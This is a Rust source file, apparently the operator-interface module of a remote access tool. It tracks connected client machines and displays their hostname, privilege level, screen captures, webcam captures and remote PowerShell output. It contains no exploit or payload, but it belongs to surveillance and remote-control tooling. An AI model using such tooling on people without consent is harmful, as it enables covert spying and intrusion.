use crate::{
    manager::types::{ProcessedResponse, UiManagerResponse},
    types::*,
    ui::{client::ClientView, view::View},
};
use egui::Context;
use shared::commands::CaptureType;

// updates coming in to/from the Server
pub fn server(view: &mut View, _ctx: &Context) {
    // in the case that we'd need to manipulate the UI from this code,
    // ctx is given as an argument. but we don't need it, so it's prefixed again.
    while let Ok(msg) = view.mouthpiece.from_server.try_recv() { // when we get a message from the server mouthpiece
        match msg {
            ServerMessage::Listening => { // if it tells us we're now listening
                view.state.listening = true; // update the ui state variable appropriately
            }
            ServerMessage::Stopped => { // do the same if we're done listening
                view.state.listening = false;
            }
        }
    }
}

// updates coming in from the Manager
pub fn manager(view: &mut View, _ctx: &Context) {
    // wait until we receive a message from the manager
    while let Ok(msg) = view.mouthpiece.from_manager.try_recv() {
        match msg {
            UiManagerResponse::GetResponse(mutex, response) => {
                match response {
                    ProcessedResponse::Success => {
                        // there is nothing to do here
                    }
                    ProcessedResponse::ComputerInfo(info, socket) => {
                        // if our client hashmap already has this mutex as a key
                        if view.state.clients.contains_key(&mutex) {
                            // we already have info on this client. we don't need to add it again
                            println!("[*] already have this client");
                        } else {
                            println!("[*] new client to show on screen");
                            view.state.clients.insert( // add to the hashmap
                                mutex.clone(), // clone the mutex to keep
                                ClientView::new( // create a new ClientView struct for this client
                                    // we use this struct to store info shown on the UI
                                    socket.to_string(), // IP address and port client is connecting from
                                    mutex,
                                    info, // ComputerInfoResponse struct containing:
                                    // hostname, elevation status, monitors and cameras connected
                                    view.mouthpiece.to_manager.clone(), // channel to send messages back to the manager if we need to
                                ),
                            );
                        }
                    }
                    //                               enum of Camera, Screen, or (unused) Mic
                    ProcessedResponse::CapturePacket(capture_type, image) => {
                        // ensure this client actually exists before trying anything
                        if let Some(client) = view.state.clients.get_mut(&mutex) {
                            match capture_type {
                                CaptureType::Screen => { // if we get Screen data
                                    client.state.captures.screen.data = Some(image); // update Screen view state
                                    client.state.textures.screen = None; // reset texture so it gets repainted
                                }
                                CaptureType::Camera => {
                                    client.state.captures.webcam.data = Some(image); // update Webcam view state
                                    client.state.textures.webcam = None; // reset texture so it gets repainted
                                }
                                _ => { /* audio not implemented for many reasons */ }
                            }
                        }
                    }
                    ProcessedResponse::PowerShell(stdout) => {
                        // ensure client exists
                        if let Some(client) = view.state.clients.get_mut(&mutex) {
                            // display shell response in output read-only text box
                            client.state.powershell.output = stdout;
                        }
                    }
                    ProcessedResponse::Error(err) => {
                        println!("[x] oops: {}", err);
                    }
                }
            }
            UiManagerResponse::Remove(mutex) => { // if we are told to remove the client
                view.state.clients.remove(&mutex); // remove it from the view state
            }
            UiManagerResponse::RemoveAll => { // if we are told to remove ALL clients
                view.state.clients.clear(); // we wipe the view state hashmap entirely
            }
        }
    }
}
